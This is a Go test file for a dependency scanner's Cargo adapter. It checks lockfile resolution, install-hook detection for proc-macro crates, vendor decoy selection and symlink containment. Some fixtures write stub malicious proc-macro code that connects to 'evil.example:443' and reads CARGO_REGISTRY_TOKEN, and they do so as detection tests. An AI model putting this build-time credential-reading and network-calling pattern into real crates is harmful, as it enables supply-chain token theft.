package cargo

import (
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/ecosystem/instsurf"
	"ihbv.io/depsnort/internal/graph"
)

func TestDetect(t *testing.T) {
	a := New()
	if !a.Detect("testdata") {
		t.Error("should detect testdata directory with Cargo.lock")
	}
	if !a.Detect("testdata/Cargo.lock") {
		t.Error("should detect testdata/Cargo.lock directly")
	}
	if a.Detect("testdata/nonexistent") {
		t.Error("should not detect nonexistent path")
	}
}

func TestResolve(t *testing.T) {
	a := New()
	g, err := a.Resolve("testdata")
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	if len(g.Roots) != 1 {
		t.Fatalf("roots = %d, want 1", len(g.Roots))
	}

	// Expect: my-project (root) + serde + serde_derive + proc-macro2 + tokio = 5 nodes
	nodes := g.SortedNodes()
	if len(nodes) != 5 {
		for _, n := range nodes {
			t.Logf("  node: %s (depth=%d)", n.ID, n.Depth)
		}
		t.Fatalf("nodes = %d, want 5", len(nodes))
	}

	// Root is my-project.
	root := g.Get("pkg:cargo/my-project@0.1.0")
	if root == nil {
		t.Fatal("root my-project node missing")
	}
	if root.Depth != 0 {
		t.Errorf("root depth = %d, want 0", root.Depth)
	}

	// serde is direct (depth 1).
	serde := g.Get("pkg:cargo/serde@1.0.188")
	if serde == nil {
		t.Fatal("serde node missing")
	}
	if !serde.Direct {
		t.Error("serde should be direct")
	}
	if serde.Depth != 1 {
		t.Errorf("serde depth = %d, want 1", serde.Depth)
	}

	// proc-macro2 is transitive (depth 3: root -> serde -> serde_derive -> proc-macro2).
	pm2 := g.Get("pkg:cargo/proc-macro2@1.0.66")
	if pm2 == nil {
		t.Fatal("proc-macro2 node missing")
	}
	if pm2.Depth != 3 {
		t.Errorf("proc-macro2 depth = %d, want 3", pm2.Depth)
	}
}

func TestResolveEdges(t *testing.T) {
	a := New()
	g, err := a.Resolve("testdata")
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	edges := g.SortedEdges()
	rootID := "pkg:cargo/my-project@0.1.0"
	serdeID := "pkg:cargo/serde@1.0.188"
	tokioID := "pkg:cargo/tokio@1.32.0"

	var rootToSerde, rootToTokio bool
	for _, e := range edges {
		if e.From == rootID && e.To == serdeID {
			rootToSerde = true
		}
		if e.From == rootID && e.To == tokioID {
			rootToTokio = true
		}
	}
	if !rootToSerde {
		t.Error("missing edge: my-project -> serde")
	}
	if !rootToTokio {
		t.Error("missing edge: my-project -> tokio")
	}
}

// AV-04: a proc-macro crate declared in Cargo.toml should generate a hook node.
func TestIsProcMacroCrate(t *testing.T) {
	tests := []struct {
		name string
		toml string
		want bool
	}{
		{
			name: "proc-macro crate",
			toml: "[package]\nname = \"my-derive\"\n\n[lib]\nproc-macro = true\n",
			want: true,
		},
		{
			name: "proc_macro underscore variant",
			toml: "[package]\nname = \"my-derive\"\n\n[lib]\nproc_macro = true\n",
			want: true,
		},
		{
			name: "normal crate",
			toml: "[package]\nname = \"my-lib\"\n\n[dependencies]\n",
			want: false,
		},
		{
			name: "proc-macro false",
			toml: "[package]\nname = \"my-lib\"\n\n[lib]\nproc-macro = false\n",
			want: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := isProcMacroCrate(tt.toml); got != tt.want {
				t.Errorf("isProcMacroCrate() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestProcMacroInstallSurface(t *testing.T) {
	a := New()
	g, err := a.Resolve("testdata/proc-macro")
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if err := a.ExtractInstallSurface("testdata/proc-macro", g); err != nil {
		t.Fatalf("ExtractInstallSurface: %v", err)
	}

	var hookFound bool
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Name == "proc-macro" {
			hookFound = true
			break
		}
	}
	if !hookFound {
		for _, n := range g.SortedNodes() {
			t.Logf("  node: %s kind=%s name=%s", n.ID, n.Kind, n.Name)
		}
		t.Error("proc-macro crate should generate a hook node")
	}
}

// AV-04: a malicious proc-macro with network+credential markers in lib.rs
// must produce a hook node with those capabilities so VC-002 checks fire.
func TestMaliciousProcMacroCapabilities(t *testing.T) {
	a := New()
	g, err := a.Resolve("testdata/proc-macro-malicious")
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if err := a.ExtractInstallSurface("testdata/proc-macro-malicious", g); err != nil {
		t.Fatalf("ExtractInstallSurface: %v", err)
	}

	var hook *graph.Node
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Name == "proc-macro" {
			hook = n
			break
		}
	}
	if hook == nil {
		t.Fatal("malicious proc-macro should generate a hook node")
	}
	if hook.Attr["cap.exec"] != "true" {
		t.Error("hook missing cap.exec")
	}
	if hook.Attr["cap.network"] != "true" {
		t.Error("hook missing cap.network (TcpStream::connect in lib.rs)")
	}
	if hook.Attr["cap.credentials"] != "true" {
		t.Error("hook missing cap.credentials (CARGO_REGISTRY_TOKEN in lib.rs)")
	}
}

// AV-04: a benign proc-macro (no lib.rs or clean lib.rs) must NOT produce
// VC-002 findings — bare CapExec is the false-positive discipline.
func TestBenignProcMacroNoExtraCaps(t *testing.T) {
	a := New()
	g, err := a.Resolve("testdata/proc-macro")
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if err := a.ExtractInstallSurface("testdata/proc-macro", g); err != nil {
		t.Fatalf("ExtractInstallSurface: %v", err)
	}
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Name == "proc-macro" {
			if n.Attr["cap.network"] == "true" {
				t.Error("benign proc-macro should not have cap.network")
			}
			if n.Attr["cap.credentials"] == "true" {
				t.Error("benign proc-macro should not have cap.credentials")
			}
			return
		}
	}
	t.Error("proc-macro hook node missing")
}

func TestNonProcMacroCrateNoHook(t *testing.T) {
	a := New()
	g, err := a.Resolve("testdata")
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	err = a.ExtractInstallSurface("testdata", g)
	if err != nil {
		gaps := instsurf.GapsOf(err)
		if len(gaps) == 0 {
			t.Fatalf("ExtractInstallSurface: %v", err)
		}
	}
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Name == "proc-macro" {
			t.Error("non-proc-macro crate should not generate a proc-macro hook node")
		}
	}
}

// AV-04: a vendored dependency crate declared as proc-macro must produce a
// hook node with capabilities from its src/lib.rs.
func TestDependencyProcMacroDetection(t *testing.T) {
	a := New()
	g, err := a.Resolve("testdata/cargo-dep-procmacro")
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if err := a.ExtractInstallSurface("testdata/cargo-dep-procmacro", g); err != nil {
		t.Fatalf("ExtractInstallSurface: %v", err)
	}

	maliciousID := "pkg:cargo/malicious-derive@1.0.0"
	var hookFound bool
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == maliciousID {
			hookFound = true
			if n.Attr["cap.exec"] != "true" {
				t.Error("hook missing cap.exec")
			}
			if n.Attr["cap.network"] != "true" {
				t.Error("hook missing cap.network (TcpStream::connect in lib.rs)")
			}
			if n.Attr["cap.credentials"] != "true" {
				t.Error("hook missing cap.credentials (CARGO_REGISTRY_TOKEN in lib.rs)")
			}
			break
		}
	}
	if !hookFound {
		for _, n := range g.SortedNodes() {
			t.Logf("  node: %s kind=%s name=%s hook.package=%s", n.ID, n.Kind, n.Name, n.Attr["hook.package"])
		}
		t.Error("dependency proc-macro malicious-derive should produce a hook node")
	}

	// Root crate is NOT a proc-macro; it must not have a proc-macro hook.
	rootID := g.Roots[0]
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Name == "proc-macro" && n.Attr["hook.package"] == rootID {
			t.Error("root crate should not have a proc-macro hook (it is not a proc-macro)")
		}
	}
}

// AV-04: a benign vendored proc-macro dependency must get bare CapExec only —
// no cap.network or cap.credentials.
func TestBenignDependencyProcMacroNoExtraCaps(t *testing.T) {
	a := New()
	g, err := a.Resolve("testdata/cargo-dep-procmacro")
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if err := a.ExtractInstallSurface("testdata/cargo-dep-procmacro", g); err != nil {
		t.Fatalf("ExtractInstallSurface: %v", err)
	}

	benignID := "pkg:cargo/benign-derive@1.0.0"
	var hookFound bool
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == benignID {
			hookFound = true
			if n.Attr["cap.network"] == "true" {
				t.Error("benign dependency proc-macro should not have cap.network")
			}
			if n.Attr["cap.credentials"] == "true" {
				t.Error("benign dependency proc-macro should not have cap.credentials")
			}
			break
		}
	}
	if !hookFound {
		for _, n := range g.SortedNodes() {
			t.Logf("  node: %s kind=%s name=%s", n.ID, n.Kind, n.Name)
		}
		t.Error("benign dependency proc-macro should produce a hook node (with bare cap.exec)")
	}
}

// AV-04: a vendored dependency in --versioned-dirs layout (vendor/<name>-<version>)
// must produce a hook node with capabilities from its src/lib.rs.
func TestVersionedVendorProcMacroDetection(t *testing.T) {
	a := New()
	g, err := a.Resolve("testdata/cargo-versioned-vendor")
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	err = a.ExtractInstallSurface("testdata/cargo-versioned-vendor", g)
	if err != nil {
		gaps := instsurf.GapsOf(err)
		if len(gaps) == 0 {
			t.Fatalf("ExtractInstallSurface: %v", err)
		}
	}

	maliciousID := "pkg:cargo/evil-macro@2.0.0"
	var hookFound bool
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == maliciousID {
			hookFound = true
			if n.Attr["cap.exec"] != "true" {
				t.Error("hook missing cap.exec")
			}
			if n.Attr["cap.network"] != "true" {
				t.Error("hook missing cap.network (TcpStream::connect in lib.rs)")
			}
			if n.Attr["cap.credentials"] != "true" {
				t.Error("hook missing cap.credentials (CARGO_REGISTRY_TOKEN in lib.rs)")
			}
			break
		}
	}
	if !hookFound {
		for _, n := range g.SortedNodes() {
			t.Logf("  node: %s kind=%s name=%s hook.package=%s", n.ID, n.Kind, n.Name, n.Attr["hook.package"])
		}
		t.Error("versioned-vendor proc-macro evil-macro should produce a hook node")
	}

	// Root crate is NOT a proc-macro; it must not have a proc-macro hook.
	rootID := g.Roots[0]
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Name == "proc-macro" && n.Attr["hook.package"] == rootID {
			t.Error("root crate should not have a proc-macro hook (it is not a proc-macro)")
		}
	}
}

// AV-04: when both vendor/<name> (version 1.0.0 decoy) and
// vendor/<name>-<version> (version 2.0.0 malicious) exist, the extractor must
// select the directory whose Cargo.toml identity matches the requested version,
// not the first directory found. The malicious payload must reach VC-002d.
func TestDecoyShadowProcMacroDetection(t *testing.T) {
	a := New()
	g, err := a.Resolve("testdata/cargo-decoy-shadow")
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	err = a.ExtractInstallSurface("testdata/cargo-decoy-shadow", g)
	if err != nil {
		gaps := instsurf.GapsOf(err)
		if len(gaps) == 0 {
			t.Fatalf("ExtractInstallSurface: %v", err)
		}
	}

	maliciousID := "pkg:cargo/evil-macro@2.0.0"
	var hookFound bool
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == maliciousID {
			hookFound = true
			if n.Attr["cap.exec"] != "true" {
				t.Error("hook missing cap.exec")
			}
			if n.Attr["cap.network"] != "true" {
				t.Error("hook missing cap.network (TcpStream::connect in lib.rs)")
			}
			if n.Attr["cap.credentials"] != "true" {
				t.Error("hook missing cap.credentials (CARGO_REGISTRY_TOKEN in lib.rs)")
			}
			break
		}
	}
	if !hookFound {
		for _, n := range g.SortedNodes() {
			t.Logf("  node: %s kind=%s name=%s hook.package=%s", n.ID, n.Kind, n.Name, n.Attr["hook.package"])
		}
		t.Error("decoy-shadowed malicious proc-macro should produce a hook with capabilities")
	}
}

// AV-04: reversing the payloads (malicious in vendor/<name>, benign in
// vendor/<name>-<version>) must still attribute to the correct version.
func TestDecoyShadowReversed(t *testing.T) {
	base := t.TempDir()
	project := filepath.Join(base, "project")

	if err := os.MkdirAll(filepath.Join(project, "vendor", "test-macro", "src"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(project, "vendor", "test-macro-1.0.0", "src"), 0o755); err != nil {
		t.Fatal(err)
	}

	os.WriteFile(filepath.Join(project, "Cargo.toml"), []byte(`[package]
name = "rev-test"
version = "0.1.0"

[dependencies]
test-macro = "1.0.0"
`), 0o644)

	os.WriteFile(filepath.Join(project, "Cargo.lock"), []byte(`# This file is automatically @generated by Cargo.
version = 3

[[package]]
name = "rev-test"
version = "0.1.0"
dependencies = [
 "test-macro",
]

[[package]]
name = "test-macro"
version = "1.0.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
`), 0o644)

	// vendor/test-macro has WRONG version (2.0.0) with malicious content
	os.WriteFile(filepath.Join(project, "vendor", "test-macro", "Cargo.toml"), []byte(`[package]
name = "test-macro"
version = "2.0.0"

[lib]
proc-macro = true
`), 0o644)
	os.WriteFile(filepath.Join(project, "vendor", "test-macro", "src", "lib.rs"), []byte(`use std::net::TcpStream;
fn evil() { TcpStream::connect("evil.example:443"); }
`), 0o644)

	// vendor/test-macro-1.0.0 has correct version (1.0.0), benign
	os.WriteFile(filepath.Join(project, "vendor", "test-macro-1.0.0", "Cargo.toml"), []byte(`[package]
name = "test-macro"
version = "1.0.0"

[lib]
proc-macro = true
`), 0o644)
	os.WriteFile(filepath.Join(project, "vendor", "test-macro-1.0.0", "src", "lib.rs"), []byte(`use proc_macro::TokenStream;
#[proc_macro_derive(Clean)]
pub fn derive(input: TokenStream) -> TokenStream { input }
`), 0o644)

	a := New()
	g, err := a.Resolve(project)
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	err = a.ExtractInstallSurface(project, g)
	if err != nil {
		gaps := instsurf.GapsOf(err)
		if len(gaps) == 0 {
			t.Fatalf("ExtractInstallSurface: %v", err)
		}
	}

	pkgID := "pkg:cargo/test-macro@1.0.0"
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == pkgID {
			if n.Attr["cap.network"] == "true" {
				t.Error("benign version 1.0.0 should not have cap.network — wrong vendor dir was selected")
			}
			return
		}
	}
	t.Error("test-macro@1.0.0 hook node missing")
}

func TestExtractTOMLString(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{`name = "serde"`, "serde"},
		{`version = "1.0.0"`, "1.0.0"},
		{`source = "registry+https://github.com/rust-lang/crates.io-index"`, "registry+https://github.com/rust-lang/crates.io-index"},
		{`no-equals`, ""},
	}
	for _, tt := range tests {
		got := extractTOMLString(tt.input)
		if got != tt.want {
			t.Errorf("extractTOMLString(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

// AV-20: a vendored dependency whose directory is a symlink pointing outside
// the project root must be refused by containment checking. The external
// content must NOT enter the graph as an install-hook node, and a
// containment-refusal gap must be emitted.
func TestVendorSymlinkContainment(t *testing.T) {
	// ---- lay out the project inside a temp dir ----
	base := t.TempDir()
	project := filepath.Join(base, "project")

	if err := os.MkdirAll(filepath.Join(project, "vendor"), 0o755); err != nil {
		t.Fatal(err)
	}

	cargoToml := `[package]
name = "my-app"
version = "0.1.0"
edition = "2021"

[dependencies]
escaped-crate = "1.0.0"
`
	if err := os.WriteFile(filepath.Join(project, "Cargo.toml"), []byte(cargoToml), 0o644); err != nil {
		t.Fatal(err)
	}

	cargoLock := `# This file is automatically @generated by Cargo.
# It is not intended for manual editing.
version = 3

[[package]]
name = "my-app"
version = "0.1.0"
dependencies = [
 "escaped-crate",
]

[[package]]
name = "escaped-crate"
version = "1.0.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
`
	if err := os.WriteFile(filepath.Join(project, "Cargo.lock"), []byte(cargoLock), 0o644); err != nil {
		t.Fatal(err)
	}

	// ---- create the EXTERNAL (malicious) directory outside the project ----
	external := filepath.Join(base, "external-payload")
	if err := os.MkdirAll(filepath.Join(external, "src"), 0o755); err != nil {
		t.Fatal(err)
	}

	maliciousToml := `[package]
name = "escaped-crate"
version = "1.0.0"

[lib]
proc-macro = true
`
	if err := os.WriteFile(filepath.Join(external, "Cargo.toml"), []byte(maliciousToml), 0o644); err != nil {
		t.Fatal(err)
	}

	maliciousLib := `use std::net::TcpStream;
fn exfil() { TcpStream::connect("evil.example:443"); std::env::var("CARGO_REGISTRY_TOKEN"); }
`
	if err := os.WriteFile(filepath.Join(external, "src", "lib.rs"), []byte(maliciousLib), 0o644); err != nil {
		t.Fatal(err)
	}

	// ---- plant symlink: vendor/escaped-crate -> external directory ----
	if err := os.Symlink(external, filepath.Join(project, "vendor", "escaped-crate")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	// ---- resolve the dependency graph ----
	a := New()
	g, err := a.Resolve(project)
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	// Sanity: the escaped-crate node must exist in the graph (from Cargo.lock).
	escapedID := "pkg:cargo/escaped-crate@1.0.0"
	if g.Get(escapedID) == nil {
		t.Fatal("escaped-crate node missing from resolved graph")
	}

	// ---- extract install surface ----
	err = a.ExtractInstallSurface(project, g)

	// The error must be non-nil: containment refused the symlinked vendor dir.
	if err == nil {
		t.Fatal("ExtractInstallSurface returned nil error — the symlink escape was not detected")
	}

	// Extract typed gaps and verify at least one is a containment refusal.
	gaps := instsurf.GapsOf(err)
	if len(gaps) == 0 {
		t.Fatalf("expected containment-refusal gap(s), got non-gap error: %v", err)
	}
	var containmentFound bool
	for _, gap := range gaps {
		if gap.Reason == instsurf.GapContainment {
			containmentFound = true
			break
		}
	}
	if !containmentFound {
		t.Errorf("expected a gap with reason %q, got gaps: %v", instsurf.GapContainment, gaps)
	}

	// The external proc-macro content must NOT have entered the graph as an
	// install-hook node. If it did, the containment check failed to block the
	// attacker's payload.
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == escapedID {
			t.Errorf("install-hook node found for escaped crate %s — external content leaked into the graph", escapedID)
		}
	}
}
